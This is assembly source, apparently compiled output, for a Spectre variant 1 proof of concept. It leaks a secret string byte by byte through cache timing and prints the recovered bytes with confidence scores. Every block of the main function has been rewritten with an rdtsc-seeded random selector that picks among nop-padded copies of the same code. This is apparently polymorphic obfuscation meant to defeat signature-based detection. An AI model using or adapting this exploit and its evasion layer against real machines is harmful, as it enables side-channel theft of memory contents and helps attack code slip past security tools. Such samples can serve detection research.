	addq	$144, %rsp
	popq	%rbp
	retq
	.cfi_endproc
                                        ## -- End function
	.globl	_main                           ## -- Begin function main
	.p2align	4, 0x90
_main:
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	subq	$80, %rsp
	movq	___stack_chk_guard@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	%rax, -8(%rbp)
	movl	$0, -20(%rbp)
	movl	%edi, -24(%rbp)
	movq	%rsi, -32(%rbp)
	movl	$80, -36(%rbp)
	movq	_secret(%rip), %rax
	leaq	_array1(%rip), %rcx
	subq	%rcx, %rax
	movq	%rax, -48(%rbp)
	movl	$40, -52(%rbp)
	movl	$0, -60(%rbp)
LBB2_1:                                 ## =>This Inner Loop Header: Depth=1
## Start of variant dynamic selector
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	movl	random_selector(%rip), %eax
	testl	%eax, %eax
	jne	.Lmain_win6_skip_init
	rdtsc
	xorq	%rdx, %rax
	movl	%eax, random_selector(%rip)
.Lmain_win6_skip_init:
	movl	random_selector(%rip), %eax
	xorl	%edx, %edx
	movl	$3, %ecx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lmain_win6_var0
	cmpl	$1, %eax
	je	.Lmain_win6_var1
	cmpl	$2, %eax
	je	.Lmain_win6_var2
	jmp	.Lmain_win6_var0
## Variant 0
.Lmain_win6_var0:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 1
.Lmain_win6_var1:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 2
.Lmain_win6_var2:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
	nop
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	nop
	jmp	.Lmain_win6_continue
.Lmain_win6_continue:
	addl	$1, %eax
	movl	%eax, -60(%rbp)
	jmp	LBB2_1
LBB2_4:
## Start of variant dynamic selector
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	movl	random_selector(%rip), %eax
	testl	%eax, %eax
	jne	.Lmain_win5_skip_init
	rdtsc
	xorq	%rdx, %rax
	movl	%eax, random_selector(%rip)
.Lmain_win5_skip_init:
	movl	random_selector(%rip), %eax
	xorl	%edx, %edx
	movl	$3, %ecx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lmain_win5_var0
	cmpl	$1, %eax
	je	.Lmain_win5_var1
	cmpl	$2, %eax
	je	.Lmain_win5_var2
	jmp	.Lmain_win5_var0
## Variant 0
.Lmain_win5_var0:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 1
.Lmain_win5_var1:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	nop
	nop
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 2
.Lmain_win5_var2:
	popq	%rax
	nop
	cmpl	$2, -24(%rbp)
	nop
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
.Lmain_win5_continue:
	movb	$0, %al
	callq	_sscanf
LBB2_6:
## Start of variant dynamic selector
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	movl	random_selector(%rip), %eax
	testl	%eax, %eax
	jne	.Lmain_win4_skip_init
	rdtsc
	xorq	%rdx, %rax
	movl	%eax, random_selector(%rip)
.Lmain_win4_skip_init:
	movl	random_selector(%rip), %eax
	xorl	%edx, %edx
	movl	$3, %ecx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lmain_win4_var0
	cmpl	$1, %eax
	je	.Lmain_win4_var1
	cmpl	$2, %eax
	je	.Lmain_win4_var2
	jmp	.Lmain_win4_var0
## Variant 0
.Lmain_win4_var0:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 1
.Lmain_win4_var1:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	nop
	leaq	-48(%rbp), %rdx
	nop
	jmp	.Lmain_win4_continue
## Variant 2
.Lmain_win4_var2:
	popq	%rax
	cmpl	$4, -24(%rbp)
	nop
	jl	LBB2_8
## %bb.7:
	nop
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	nop
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
.Lmain_win4_continue:
	movb	$0, %al
	callq	_sscanf
	movq	-48(%rbp), %rax
	leaq	_array1(%rip), %rcx
	subq	%rcx, %rax
	movq	%rax, -48(%rbp)
	movq	-32(%rbp), %rax
	movq	24(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-52(%rbp), %rdx
	movb	$0, %al
	callq	_sscanf
LBB2_8:
	movl	-36(%rbp), %esi
	leaq	L_.str.3(%rip), %rdi
	movb	$0, %al
	callq	_printf
	leaq	L_.str.4(%rip), %rdi
	movb	$0, %al
	callq	_printf
	leaq	L_.str.5(%rip), %rdi
	movb	$0, %al
	callq	_printf
	leaq	L_.str.6(%rip), %rdi
	movb	$0, %al
	callq	_printf
	leaq	L_.str.7(%rip), %rdi
	movb	$0, %al
	callq	_printf
	leaq	L_.str.8(%rip), %rdi
	movb	$0, %al
	callq	_printf
	leaq	L_.str.9(%rip), %rdi
	movb	$0, %al
	callq	_printf
	leaq	L_.str.10(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-52(%rbp), %esi
	leaq	L_.str.11(%rip), %rdi
	movb	$0, %al
	callq	_printf
LBB2_9:                                 ## =>This Inner Loop Header: Depth=1
	movl	-52(%rbp), %eax
	addl	$-1, %eax
	movl	%eax, -52(%rbp)
## Start of variant dynamic selector
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	movl	random_selector(%rip), %eax
	testl	%eax, %eax
	jne	.Lmain_win3_skip_init
	rdtsc
	xorq	%rdx, %rax
	movl	%eax, random_selector(%rip)
.Lmain_win3_skip_init:
	movl	random_selector(%rip), %eax
	xorl	%edx, %edx
	movl	$3, %ecx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lmain_win3_var0
	cmpl	$1, %eax
	je	.Lmain_win3_var1
	cmpl	$2, %eax
	je	.Lmain_win3_var2
	jmp	.Lmain_win3_var0
## Variant 0
.Lmain_win3_var0:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 1
.Lmain_win3_var1:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	nop
	callq	_printf
	movl	-36(%rbp), %edi
	nop
	jmp	.Lmain_win3_continue
## Variant 2
.Lmain_win3_var2:
	popq	%rax
	cmpl	$0, %eax
	nop
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	nop
	callq	_printf
	nop
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
.Lmain_win3_continue:
	movq	-48(%rbp), %rsi
	movq	%rsi, %rax
	addq	$1, %rax
	movq	%rax, -48(%rbp)
	leaq	-54(%rbp), %rdx
	leaq	-16(%rbp), %rcx
	callq	_readMemoryByte
	movl	-16(%rbp), %ecx
	movl	-12(%rbp), %edx
	shll	%edx
	leaq	L_.str.15(%rip), %rsi
	leaq	L_.str.14(%rip), %rax
	cmpl	%edx, %ecx
	cmovgeq	%rax, %rsi
	leaq	L_.str.13(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movzbl	-54(%rbp), %eax
	movl	%eax, -64(%rbp)    # # 4-byte Spill
	movzbl	-54(%rbp), %eax
## Start of variant dynamic selector
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	movl	random_selector(%rip), %eax
	testl	%eax, %eax
	jne	.Lmain_win2_skip_init
	rdtsc
	xorq	%rdx, %rax
	movl	%eax, random_selector(%rip)
.Lmain_win2_skip_init:
	movl	random_selector(%rip), %eax
	xorl	%edx, %edx
	movl	$3, %ecx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lmain_win2_var0
	cmpl	$1, %eax
	je	.Lmain_win2_var1
	cmpl	$2, %eax
	je	.Lmain_win2_var2
	jmp	.Lmain_win2_var0
## Variant 0
.Lmain_win2_var0:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 1
.Lmain_win2_var1:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 2
.Lmain_win2_var2:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
.Lmain_win2_continue:
	movl	%eax, -68(%rbp)    # # 4-byte Spill
	jmp	LBB2_14
LBB2_13:                                ##   in Loop: Header=BB2_9 Depth=1
	movl	$63, %eax
	movl	%eax, -68(%rbp)    # # 4-byte Spill
	jmp	LBB2_14
LBB2_14:                                ##   in Loop: Header=BB2_9 Depth=1
	movl	-64(%rbp), %esi    # # 4-byte Reload
	movl	-68(%rbp), %edx    # # 4-byte Reload
	movl	-16(%rbp), %ecx
	leaq	L_.str.16(%rip), %rdi
	movb	$0, %al
	callq	_printf
## Start of variant dynamic selector
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	movl	random_selector(%rip), %eax
	testl	%eax, %eax
	jne	.Lmain_win1_skip_init
	rdtsc
	xorq	%rdx, %rax
	movl	%eax, random_selector(%rip)
.Lmain_win1_skip_init:
	movl	random_selector(%rip), %eax
	xorl	%edx, %edx
	movl	$3, %ecx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lmain_win1_var0
	cmpl	$1, %eax
	je	.Lmain_win1_var1
	cmpl	$2, %eax
	je	.Lmain_win1_var2
	jmp	.Lmain_win1_var0
## Variant 0
.Lmain_win1_var0:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 1
.Lmain_win1_var1:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	nop
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win1_continue
## Variant 2
.Lmain_win1_var2:
	popq	%rax
	cmpl	$0, -12(%rbp)
	nop
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
.Lmain_win1_continue:
## Start of variant dynamic selector
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	movl	random_selector(%rip), %eax
	testl	%eax, %eax
	jne	.Lmain_win0_skip_init
	rdtsc
	xorq	%rdx, %rax
	movl	%eax, random_selector(%rip)
.Lmain_win0_skip_init:
	movl	random_selector(%rip), %eax
	xorl	%edx, %edx
	movl	$3, %ecx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lmain_win0_var0
	cmpl	$1, %eax
	je	.Lmain_win0_var1
	cmpl	$2, %eax
	je	.Lmain_win0_var2
	jmp	.Lmain_win0_var0
## Variant 0
.Lmain_win0_var0:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 1
.Lmain_win0_var1:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	nop
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 2
.Lmain_win0_var2:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win0_continue
.Lmain_win0_continue:
	movl	%eax, -76(%rbp)    # # 4-byte Spill
	jmp	LBB2_19
LBB2_18:                                ##   in Loop: Header=BB2_9 Depth=1
	movl	$63, %eax
	movl	%eax, -76(%rbp)    # # 4-byte Spill
	jmp	LBB2_19
LBB2_19:                                ##   in Loop: Header=BB2_9 Depth=1
	movl	-72(%rbp), %esi    # # 4-byte Reload
	movl	-76(%rbp), %edx    # # 4-byte Reload
	movl	-12(%rbp), %ecx
	leaq	L_.str.17(%rip), %rdi
	movb	$0, %al
	callq	_printf
LBB2_20:                                ##   in Loop: Header=BB2_9 Depth=1
	leaq	L_.str.10(%rip), %rdi
	movb	$0, %al
	callq	_printf
	jmp	LBB2_9
LBB2_21:
	movq	___stack_chk_guard@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	-8(%rbp), %rcx
	cmpq	%rcx, %rax
	jne	LBB2_23
## %bb.22:
	xorl	%eax, %eax
	addq	$80, %rsp
	popq	%rbp
	retq
LBB2_23:
	callq	___stack_chk_fail
	.cfi_endproc
                                        ## -- End function
	.section	__DATA,__data
	.globl	_array1_size                    ## @array1_size
	.p2align	2, 0x0
_array1_size:
	.long	16                              ## 0x10
	.globl	_array1                         ## @array1
	.p2align	4, 0x0
_array1:
	.ascii	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.section	__TEXT,__cstring,cstring_literals
	L_.str	:    # # @.str
	.asciz	"The Magic Words are Squeamish Ossifrage."
	.section	__DATA,__data
	.globl	_secret                         ## @secret
	.p2align	3, 0x0
_secret:
	.quad	L_.str
	.globl	_temp                           ## @temp
.zerofill __DATA,__common,_temp,1,0
	.comm	_array2,131072,4                ## @array2
.zerofill __DATA,__bss,_readMemoryByte.results,1024,4 ## @readMemoryByte.results
	.section	__TEXT,__cstring,cstring_literals
	L_.str.1	:    # # @.str.1
	.asciz	"%d"
	L_.str.2	:    # # @.str.2
	.asciz	"%p"
	L_.str.3	:    # # @.str.3
	.asciz	"Using a cache hit threshold of %d.\n"
	L_.str.4	:    # # @.str.4
	.asciz	"Build: "
	L_.str.5	:    # # @.str.5
	.asciz	"RDTSCP_SUPPORTED "
	L_.str.6	:    # # @.str.6
	.asciz	"MFENCE_SUPPORTED "
	L_.str.7	:    # # @.str.7
	.asciz	"CLFLUSH_SUPPORTED "
	L_.str.8	:    # # @.str.8
	.asciz	"INTEL_MITIGATION_DISABLED "
	L_.str.9	:    # # @.str.9
	.asciz	"LINUX_KERNEL_MITIGATION_DISABLED "
	L_.str.10	:    # # @.str.10
	.asciz	"\n"
	L_.str.11	:    # # @.str.11
	.asciz	"Reading %d bytes:\n"
	L_.str.12	:    # # @.str.12
	.asciz	"Reading at malicious_x = %p... "
	L_.str.13	:    # # @.str.13
	.asciz	"%s: "
	L_.str.14	:    # # @.str.14
	.asciz	"Success"
	L_.str.15	:    # # @.str.15
	.asciz	"Unclear"
	L_.str.16	:    # # @.str.16
	.asciz	"0x%02X=\342\200\231%c\342\200\231 score=%d "
	L_.str.17	:    # # @.str.17
	.asciz	"(second best: 0x%02X=\342\200\231%c\342\200\231 score=%d)"
	.comm	_unused1,64,4                   ## @unused1
	.comm	_unused2,64,4                   ## @unused2
.subsections_via_symbols
